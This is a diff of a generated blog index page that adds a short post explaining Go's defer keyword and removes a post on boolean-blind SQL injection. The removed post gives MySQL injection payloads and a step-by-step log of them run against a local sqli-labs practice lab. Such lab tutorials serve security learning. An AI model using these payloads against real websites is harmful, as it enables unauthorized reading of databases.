@@ -158,6 +158,99 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2018/12/16/goDefer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Dong Cong">
+      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="congdong007">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2018/12/16/goDefer/" class="post-title-link" itemprop="url">defer in the Go Language</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2018-12-16 23:33:42" itemprop="dateCreated datePublished" datetime="2018-12-16T23:33:42-05:00">2018-12-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-10-17 11:38:15" itemprop="dateModified" datetime="2023-10-17T11:38:15-04:00">2023-10-17</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/" itemprop="url" rel="index"><span itemprop="name">Go</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Go/defer/" itemprop="url" rel="index"><span itemprop="name">defer</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>In Go language, <strong><em>defer</em></strong> is a very useful keyword used for deferring the execution of functions, typically employed for performing cleanup or resource release operations before a function returns.</p>
+<p>A <strong><em>defer</em></strong> statement pushes the function call that should be deferred onto a stack and executes these deferred function calls in a <strong><em>last-in, first-out (LIFO)</em></strong> order just before the current function returns.</p>
+<p>Here are some important features and uses of <strong><em>defer</em></strong>:</p>
+<ol>
+<li><p><strong><em>Deferred Execution</em></strong>: Using the <strong><em>defer</em></strong> keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error.</p>
+</li>
+<li><p><strong><em>Resource Cleanup</em></strong>: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks.</p>
+</li>
+<li><p><strong><em>Parameter Evaluation</em></strong>: The parameters in a <strong><em>defer</em></strong> statement are evaluated when the <strong><em>defer</em></strong> statement is executed, not when the function returns.</p>
+</li>
+</ol>
+<p>Here are some examples demonstrating the use of <strong><em>defer</em></strong>:</p>
+<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="comment">// Example 1: defer for file closing</span></span><br><span class="line">    file := openFile(<span class="string">&quot;example.txt&quot;</span>)</span><br><span class="line">    <span class="keyword">defer</span> closeFile(file)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 2: defer for logging function execution time</span></span><br><span class="line">    <span class="keyword">defer</span> logTime(<span class="string">&quot;Function execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Example 3: Multiple defer statements execute in a last-in, first-out order</span></span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">1</span>; i &lt;= <span class="number">5</span>; i++ &#123;</span><br><span class="line">        <span class="keyword">defer</span> fmt.Println(<span class="string">&quot;Deferred statement&quot;</span>, i)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fmt.Println(<span class="string">&quot;Function body&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">openFile</span><span class="params">(filename <span class="type">string</span>)</span></span> *File &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Opening file:&quot;</span>, filename)</span><br><span class="line">    <span class="keyword">return</span> <span class="comment">// Open the file and return the file handle</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">closeFile</span><span class="params">(file *File)</span></span> &#123;</span><br><span class="line">    fmt.Println(<span class="string">&quot;Closing file&quot;</span>)</span><br><span class="line">    <span class="comment">// Close the file</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">logTime</span><span class="params">(message <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">    fmt.Println(message, <span class="string">&quot;at some time&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>In the above examples, <strong><em>defer</em></strong> statements are used to ensure the file is closed before main returns, log the execution time of the function, and execute multiple <strong><em>defer</em></strong> statements in a last-in, first-out order.</p>
+<p><strong><em>defer</em></strong> is a powerful tool in Go that can help you write safer and cleaner code, ensuring proper resource release and consistency.”</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2018/11/28/goAnonymousFunctionClosure/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1062,108 +1155,6 @@ These steps describe a method for performing time-based blind SQL injection to e
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2016/10/27/SQLInjectionBooleanBlind/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="Dong Cong">
-      <meta itemprop="description" content="bW9ua2V5Y2RAZ21haWwuY29t">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="congdong007">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/10/27/SQLInjectionBooleanBlind/" class="post-title-link" itemprop="url">Boolean Blind SQL Injection</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2016-10-27 20:20:57" itemprop="dateCreated datePublished" datetime="2016-10-27T20:20:57-04:00">2016-10-27</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-10-18 20:29:50" itemprop="dateModified" datetime="2023-10-18T20:29:50-04:00">2023-10-18</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/" itemprop="url" rel="index"><span itemprop="name">Penetration Test</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/" itemprop="url" rel="index"><span itemprop="name">MySQL</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/" itemprop="url" rel="index"><span itemprop="name">SQL Injection</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Penetration-Test/MySQL/SQL-Injection/Boolean-Blind-Sql-Injection/" itemprop="url" rel="index"><span itemprop="name">Boolean Blind Sql Injection</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="Boolean-Blind-SQL-Injection-Method"><a href="#Boolean-Blind-SQL-Injection-Method" class="headerlink" title="Boolean Blind SQL Injection Method"></a>Boolean Blind SQL Injection Method</h1><ol>
-<li><p>First, obtain the length of the database name:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (length(database()))&gt;n --+</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Next, retrieve the database name character by character:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (ascii(substr(database(),1,1))&gt;n) --+</span><br></pre></td></tr></table></figure>
-<p>Note: To determine the character at a specific position, you can use a binary search method.<br>To obtain the second character of the database name, simply change the position in the “substr” function.</p>
-</li>
-<li><p>Use Burp Suite’s Intruder module to iterate through the possibilities.</p>
-</li>
-<li><p>Obtain the number of tables:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>Retrieve the length of the tables.<br>These steps outline a method for conducting a blind Boolean-based SQL injection to gather information about a database, such as the database name and the number of tables.</p>
-</li>
-</ol>
-<h1 id="Example-of-Boolean-Blind-SQL-Injection-Operation"><a href="#Example-of-Boolean-Blind-SQL-Injection-Operation" class="headerlink" title="Example of Boolean Blind SQL Injection Operation"></a>Example of Boolean Blind SQL Injection Operation</h1><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; </span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=1 --+ correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and 1=2 --+ error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 3 --+  correct</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; order by 4 --+  error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; union select 1,2,3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;7 --+   correct  database name&#x27;s length &lt;=8</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (length(database()))&gt;8 --+   error</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;114) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ascii(substr(database(),1,1))&gt;115) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 3 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (select count(*) from information_schema.tables where table_schema=&#x27;security&#x27;) &gt; 4 --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 100) --+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-8/?id=1&#x27; and (ord(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 0,1),1,1)) &gt; 101) --+</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1235,19 +1226,19 @@ These steps describe a method for performing time-based blind SQL injection to e
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-count">46</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">63</span>
+        <span class="site-state-item-count">65</span>
         <span class="site-state-item-name">categories</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">21</span>
+        <span class="site-state-item-count">22</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
